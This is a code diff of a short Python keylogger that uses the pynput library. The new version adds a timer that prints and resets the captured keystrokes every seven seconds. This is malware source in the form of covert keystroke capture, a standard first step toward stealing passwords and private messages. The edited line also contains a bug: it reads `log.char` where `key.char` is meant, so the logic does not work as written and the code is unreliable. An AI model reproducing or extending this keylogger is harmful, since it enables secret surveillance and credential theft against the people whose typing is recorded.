@@ -1,22 +1,28 @@
 #!/usr/bin/env python
 
-import pynput.keyboard
+from pynput import keyboard
+import threading
 
-log = []
+log = ""
 
 def process_key_press(key):
     global log
     try:
-        log.append(f'{str(key.char)}')
+        log += str(log.char)
     except AttributeError:
-        if key == key.space:
-            log.append(" ")
-        elif key == key.shift:
-            log.append('')
+        if key == keyboard.Key.space:
+            log += " "
         else:
-            log.append(f'{str(key)}')
-    print(''.join(log))
+            log += f' {str(key)} '
 
-keyboard_listener = pynput.keyboard.Listener(on_press=process_key_press)
+def report():
+    global log
+    print(log)
+    log = ""
+    timer = threading.Timer(7, report)
+    timer.start()
+
+keyboard_listener = keyboard.Listener(on_press=process_key_press)
 with keyboard_listener:
+    report()
     keyboard_listener.join()
